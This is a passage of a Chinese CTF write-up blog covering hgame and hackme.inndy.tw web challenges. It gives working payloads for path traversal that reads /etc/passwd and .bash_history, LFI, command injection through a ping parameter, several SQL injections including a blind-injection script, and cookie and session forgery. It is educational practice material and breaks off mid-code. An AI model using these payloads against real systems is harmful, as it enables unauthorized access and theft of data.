class=\"string\">\"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL\"</span></span><br><span class=\"line\">headers = &#123;<span class=\"string\">'User-Agent'</span>:<span class=\"string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">url1 = <span class=\"string\">\"http://111.231.140.29:10000\"</span></span><br><span class=\"line\">url2 = <span class=\"string\">\"http://111.231.140.29:10000/question\"</span></span><br><span class=\"line\">url3 = <span class=\"string\">\"http://111.231.140.29:10000/solution\"</span></span><br><span class=\"line\">url4=<span class=\"string\">'http://111.231.140.29:10000/statics/style.css'</span></span><br><span class=\"line\"></span><br><span class=\"line\">res = requests.post(url1,data=dict(token=token))</span><br><span class=\"line\">cookies = res.cookies</span><br><span class=\"line\">al_list = <span class=\"string\">'1026943587'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">11</span>):</span><br><span class=\"line\">    <span class=\"comment\"># res = requests.get(url2,cookies=cookies,headers=headers)</span></span><br><span class=\"line\">    print(<span class=\"string\">'-------------round'</span>,i,<span class=\"string\">'---------------'</span>)</span><br><span class=\"line\">    exp = re.findall(<span class=\"string\">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    print(exp)</span><br><span class=\"line\">    data = dict(answer=str(eval(exp[:<span class=\"number\">-2</span>])))</span><br><span class=\"line\">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class=\"line\">    cookies = res.cookies</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">11</span>,<span class=\"number\">21</span>):</span><br><span class=\"line\">    print(<span class=\"string\">'-------------round'</span>,i,<span class=\"string\">'---------------'</span>)</span><br><span class=\"line\">    exp = re.findall(<span class=\"string\">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    exp = list(exp)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(exp)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ord(exp[x])&gt;<span class=\"number\">47</span> <span class=\"keyword\">and</span> ord(exp[x]) &lt; <span class=\"number\">59</span>:</span><br><span class=\"line\">            exp[x] = al_list[ord(exp[x])<span class=\"number\">-48</span>]</span><br><span class=\"line\">    exp = <span class=\"string\">\"\"</span>.join(exp)</span><br><span class=\"line\">    print(exp)</span><br><span class=\"line\">    data = dict(answer=str(eval(exp[:<span class=\"number\">-2</span>])))</span><br><span class=\"line\">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class=\"line\">    cookies = res.cookies</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">21</span>,<span class=\"number\">31</span>):</span><br><span class=\"line\">    print(<span class=\"string\">'-------------round'</span>,i,<span class=\"string\">'---------------'</span>)</span><br><span class=\"line\">    res = requests.get(url4,cookies=cookies,headers=headers)</span><br><span class=\"line\">    exp = re.findall(<span class=\"string\">r'content:\"(.+)\"'</span>,res.text)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    print(exp)</span><br><span class=\"line\">    data = dict(answer=str(eval(exp[:<span class=\"number\">-2</span>])))</span><br><span class=\"line\">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class=\"line\">    cookies = res.cookies</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'hgame'</span> <span class=\"keyword\">in</span> res.text:</span><br><span class=\"line\">        print(res.text)</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Math有趣\"><a href=\"#Math有趣\" class=\"headerlink\" title=\"Math有趣\"></a>Math有趣</h2><p>先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻<code>img/cXVlc3Rpb24ucG5n.php</code>，base64解码之后是<code>question.png</code>，尝试了一下<code>../../../../../etc/passwd</code>(base64编码)，发现可以成功读取文件<br><img src=\"https://i.loli.net/2019/02/12/5c623f9854da7.png\" alt=\"/etc/passwd\"><br>接下来就是探测工作目录了，学到一个东西，可以探测<code>.bash_history</code>，该文件记录了最近的bash命令<code>../../../../../root/.bash_history</code></p>\n<p><img src=\"https://i.loli.net/2019/02/12/5c6240665dab0.png\" alt></p>\n<p>工作目录为<code>/usr/local/tomcat/webapps/ROOT</code></p>\n<p>接下来我们可以给链接加<code>=</code>诱发报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;test.tan90.me:8080&#x2F;img&#x2F;cXVlc3Rpb24ucG5n&#x3D;.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.loli.net/2019/02/12/5c6240ecc59e8.png\" alt></p>\n<p>最终定位到类目录，读取代码<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p>\n<p>然后反编译，定位到flag的位置</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping</span>(value=&#123;<span class=\"string\">\"/flag\"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">Flag</span><span class=\"params\">(ModelMap model)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">\"This is the last question.\"</span>);</span><br><span class=\"line\">    System.out.println(<span class=\"string\">\"123852^x % 612799081 = 6181254136845 % 612799081\"</span>);</span><br><span class=\"line\">    System.out.println(<span class=\"string\">\"The flag is hgame&#123;x&#125;.x is a decimal number.\"</span>);</span><br><span class=\"line\">    model.addAttribute(<span class=\"string\">\"flag\"</span>, <span class=\"string\">\"Flag is not here.\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"flag\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个数学问题可以用<strong>Baby Step Giant Step</strong>算法解决，github上有相关的代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">py bsgs.py 123852 6181254136845 612799081</span><br></pre></td></tr></table></figure>\n<p>可以得到最小的答案是<code>15387368</code></p>\n<p>flag如下：<code>hgame{15387368}</code></p>\n","categories":["writeup"],"tags":["CTF"]},{"title":"hackme-web题解","url":"/2018/08/28/hackme/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址<a href=\"https://hackme.inndy.tw/\" target=\"_blank\" rel=\"noopener\">https://hackme.inndy.tw/</a></p>\n<a id=\"more\"></a>\n<h1 id=\"LFI\"><a href=\"#LFI\" class=\"headerlink\" title=\"LFI\"></a>LFI</h1><p>查看源代码</p>\n<p><img src=\"/2018/08/28/hackme/1.png\" alt></p>\n<p>尝试读取</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;flag</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p>\n</blockquote>\n<p>读取config即可得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;config</span><br></pre></td></tr></table></figure>\n<h1 id=\"homepage\"><a href=\"#homepage\" class=\"headerlink\" title=\"homepage\"></a>homepage</h1><p>查看代码在结尾看到一个<code>cute.js</code>，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可</p>\n<h1 id=\"ping\"><a href=\"#ping\" class=\"headerlink\" title=\"ping\"></a>ping</h1><p>命令执行，我们可以使用 <code>$()</code> 或者 <code><code> </code></code> 都可以实现执行命令的作用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://hackme.inndy.tw/ping/?ip=$(ls -a)</span><br></pre></td></tr></table></figure>\n<p>然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://hackme.inndy.tw/ping/?ip=$(tac *.*)</span><br></pre></td></tr></table></figure>\n<h1 id=\"scoreboard\"><a href=\"#scoreboard\" class=\"headerlink\" title=\"scoreboard\"></a>scoreboard</h1><p>f12查看点击网络，查看一下消息头即可看到flag</p>\n<h1 id=\"login-as-admin-0\"><a href=\"#login-as-admin-0\" class=\"headerlink\" title=\"login as admin 0\"></a>login as admin 0</h1><p>题目主要源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\"><span class=\"comment\">// table schema</span></span><br><span class=\"line\"><span class=\"comment\">// user -&gt; id, user, password, is_admin</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">'show_source'</span>] === <span class=\"string\">'1'</span>) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe_filter</span><span class=\"params\">($str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $strl = strtolower($str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strstr($strl, <span class=\"string\">'or 1=1'</span>) || strstr($strl, <span class=\"string\">'drop'</span>) ||</span><br><span class=\"line\">        strstr($strl, <span class=\"string\">'update'</span>) || strstr($strl, <span class=\"string\">'delete'</span>)</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace(<span class=\"string\">\"'\"</span>, <span class=\"string\">\"\\\\'\"</span>, $str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_POST = array_map(safe_filter, $_POST);</span><br><span class=\"line\">$user = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// connect to database</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'name'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">    $connection_string = sprintf(<span class=\"string\">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class=\"line\">    $db = <span class=\"keyword\">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class=\"line\">    $sql = sprintf(<span class=\"string\">\"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'\"</span>,</span><br><span class=\"line\">        $_POST[<span class=\"string\">'name'</span>],</span><br><span class=\"line\">        $_POST[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        $query = $db-&gt;query($sql);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($query) &#123;</span><br><span class=\"line\">            $user = $query-&gt;fetchObject();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $user = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(<span class=\"keyword\">Exception</span> $e) &#123;</span><br><span class=\"line\">        $user = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe_filter</span><span class=\"params\">($str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $strl = strtolower($str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strstr($strl, <span class=\"string\">'or 1=1'</span>) || strstr($strl, <span class=\"string\">'drop'</span>) ||</span><br><span class=\"line\">        strstr($strl, <span class=\"string\">'update'</span>) || strstr($strl, <span class=\"string\">'delete'</span>)</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace(<span class=\"string\">\"'\"</span>, <span class=\"string\">\"\\\\\\\\'\"</span>, $str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_</span><br></pre></td></tr></table></figure>\n<p>可以看到，题目过滤了 <code>or 1=1</code> 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">name&#x3D;guest\\&#39; or user&#x3D;0x61646d696e-- +&amp;password&#x3D;guest</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-0-1\"><a href=\"#login-as-admin-0-1\" class=\"headerlink\" title=\"login as admin 0.1\"></a>login as admin 0.1</h1><p>上个题目的加强版，直接union注入即可，最终payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">name&#x3D;guest\\&#39;  union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password&#x3D;123465</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-1\"><a href=\"#login-as-admin-1\" class=\"headerlink\" title=\"login as admin 1\"></a>login as admin 1</h1><p>题目过滤并不严格，payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin\\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1#</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-1-2\"><a href=\"#login-as-admin-1-2\" class=\"headerlink\" title=\"login as admin 1.2\"></a>login as admin 1.2</h1><p>上一题的加强版，需要进行盲注，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"https://hackme.inndy.tw/login1/index.php\"</span></span><br><span class=\"line\">length = <span class=\"number\">1</span></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#\"</span></span><br><span class=\"line\"><span class=\"comment\"># database:login_as_admin1</span></span><br><span class=\"line\"><span class=\"comment\"># payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#\"</span></span><br><span class=\"line\"><span class=\"comment\"># tables: 0bdb54c98123f5526ccaed982d2006a9,users</span></span><br><span class=\"line\"><span class=\"comment\"># payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#\"</span></span><br><span class=\"line\"><span class=\"comment\"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#\"</span>\t</span><br><span class=\"line\">data = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#\"</span>, <span class=\"string\">'password'</span>:<span class=\"string\">\"123\"</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">70</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">\t\tdata[<span class=\"string\">'name'</span>] = payload1.format(str(length),str(j))</span><br><span class=\"line\">\t\tcontent = requests.post(url,data=data).text</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">\"FLAG\"</span> <span class=\"keyword\">in</span> content:</span><br><span class=\"line\">\t\t\tflag += chr(j)</span><br><span class=\"line\">\t\t\tprint(<span class=\"string\">'**flag:**'</span>,flag)</span><br><span class=\"line\">\t\t\tlength += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-3\"><a href=\"#login-as-admin-3\" class=\"headerlink\" title=\"login as admin 3\"></a>login as admin 3</h1><p>题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 <code>!=</code> ，这就存在弱比较的漏洞</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">load_user</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $secret, $error;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($_COOKIE[<span class=\"string\">'user'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $unserialized = json_decode(base64_decode($_COOKIE[<span class=\"string\">'user'</span>]), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    $r = hash_hmac(<span class=\"string\">'sha512'</span>, $unserialized[<span class=\"string\">'data'</span>], $secret) != $unserialized[<span class=\"string\">'sig'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(hash_hmac(<span class=\"string\">'sha512'</span>, $unserialized[<span class=\"string\">'data'</span>], $secret) != $unserialized[<span class=\"string\">'sig'</span>]) &#123;</span><br><span class=\"line\">        $error = <span class=\"string\">'Invalid session'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $data = json_decode($unserialized[<span class=\"string\">'data'</span>], <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [</span><br><span class=\"line\">        <span class=\"string\">'name'</span> =&gt; $data[<span class=\"number\">0</span>],</span><br><span class=\"line\">        <span class=\"string\">'admin'</span> =&gt; $data[<span class=\"number\">1</span>]</span><br><span class=\"line\">    ];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证</p>\n<p>那么我们构造一个cookie</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_user</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $user, $secret;</span><br><span class=\"line\">    $user = [<span class=\"string\">'admin'</span>, <span class=\"keyword\">true</span>];</span><br><span class=\"line\">    $data = json_encode($user);</span><br><span class=\"line\">    $sig = <span class=\"number\">0</span>;</span><br><span class=\"line\">    $all = base64_encode(json_encode([<span class=\"string\">'sig'</span> =&gt; $sig, <span class=\"string\">'data'</span> =&gt; $data]));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $all;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> set_user();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然后刷新即可</p>\n<h1 id=\"login-as-admin-4\"><a href=\"#login-as-admin-4\" class=\"headerlink\" title=\"login as admin 4\"></a>login as admin 4</h1><p>题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -d <span class=\"string\">\"name=admin\"</span> https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure>\n<h1 id=\"Login-as-Admin-6\"><a href=\"#Login-as-Admin-6\" class=\"headerlink\" title=\"Login as Admin 6\"></a>Login as Admin 6</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'data'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        $data = json_decode($_POST[<span class=\"string\">'data'</span>], <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (<span class=\"keyword\">Exception</span> $e) &#123;</span><br><span class=\"line\">        $data = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    extract($data);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        $user = $username;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看代码可知存在变量覆盖漏洞，构造json数据即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">data=&#123;<span class=\"string\">\"users\"</span>:&#123;<span class=\"string\">\"admin\"</span>:<span class=\"string\">\"snow\"</span>&#125;,<span class=\"string\">\"username\"</span>:<span class=\"string\">\"admin\"</span>,<span class=\"string\">\"password\"</span>:<span class=\"string\">\"snow\"</span>&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-7\"><a href=\"#login-as-admin-7\" class=\"headerlink\" title=\"login as admin 7\"></a>login as admin 7</h1><p>md5弱比较</p>\n<p><img src=\"/2018/08/28/hackme/2.png\" alt=\"payload\"></p>\n<h1 id=\"login-as-admin-8\"><a href=\"#login-as-admin-8\" class=\"headerlink\" title=\"login as admin 8\"></a>login as admin 8</h1><p>以admin登录之后，抓包发现cookie很可疑</p>\n<p><img src=\"/2018/08/28/hackme/11.png\" alt=\"payload\"></p>\n<p>解码之后发现<code>is_admin</code>字段为0，修改为1后还是不行，猜测应该是<code>login&amp;sha512</code>字段没有对应修改，测试之后发现该字段为前一个cookie的sha512值，到此，payload脚本如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$s = <span class=\"string\">'O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D'</span>;</span><br><span class=\"line\">$s = urldecode($s);</span><br><span class=\"line\"><span class=\"comment\">// echo $s;</span></span><br><span class=\"line\"><span class=\"comment\">// echo hash('sha512',$s);</span></span><br><span class=\"line\">$s = str_replace(<span class=\"string\">'\"is_admin\";b:0'</span>, <span class=\"string\">'\"is_admin\";b:1'</span>, $s);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode($s).<span class=\"string\">'---'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> hash(<span class=\"string\">'sha512'</span>,$s);</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin8-1\"><a href=\"#login-as-admin8-1\" class=\"headerlink\" title=\"login as admin8.1\"></a>login as admin8.1</h1><p>前一关已经以admin身份登入取得一个flag，猜想第二个flag应该是和debug模式有关，查看session发现存在dubug字段，将其修改为1，发现不会再报错debug模式不可用，但是依然没有什么其它东西，查看cookie发现还有一个dubug_dump字段，将其修改为config.php，相应的字段长度也要修改为10</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$s = <span class=\"string\">'O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D'</span>;</span><br><span class=\"line\">$s = urldecode($s);</span><br><span class=\"line\">$s = str_replace(<span class=\"string\">'\"is_admin\";b:0'</span>, <span class=\"string\">'\"is_admin\";b:1'</span>, $s);</span><br><span class=\"line\">$s = str_replace(<span class=\"string\">'debug\";b:0'</span>, <span class=\"string\">'debug\";b:1'</span>, $s);</span><br><span class=\"line\">$s = str_replace(<span class=\"string\">'debug_dump\";s:9:\"index.php'</span>, <span class=\"string\">'debug_dump\";s:10:\"config.php'</span>, $s);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode($s).<span class=\"string\">'---'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> hash(<span class=\"string\">'sha512'</span>,$s);</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2018/08/28/hackme/12.png\" alt=\"payload\"></p>\n<h1 id=\"dafuq-manager-1\"><a href=\"#dafuq-manager-1\" class=\"headerlink\" title=\"dafuq-manager 1\"></a>dafuq-manager 1</h1><p>查看cookie可以发现 <strong><em>show_hidden</em></strong> 字段为 <strong><em>no</em></strong>，改为<strong><em>yes</em></strong>刷新即可得到flag</p>\n<h1 id=\"dafuq-manager-2\"><a href=\"#dafuq-manager-2\" class=\"headerlink\" title=\"dafuq-manager 2\"></a>dafuq-manager 2</h1><p>这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag</p>\n<p>推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">\"admin\"</span>:</span><br><span class=\"line\">        <span class=\"keyword\">require</span> <span class=\"string\">\"./core/fun_admin.php\"</span>;</span><br><span class=\"line\">        show_admin($GLOBALS[<span class=\"string\">\"dir\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure>\n<p>我们跟进fun_admin.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_admin</span><span class=\"params\">($dir)</span> </span>&#123;</span><br><span class=\"line\">    $pwd = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">2</span>) == <span class=\"number\">2</span>);</span><br><span class=\"line\">    $admin = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">4</span>) == <span class=\"number\">4</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$GLOBALS[<span class=\"string\">\"require_login\"</span>]) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"miscnofunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($GLOBALS[<span class=\"string\">'__GET'</span>][<span class=\"string\">\"action2\"</span>])) $action2 = $GLOBALS[<span 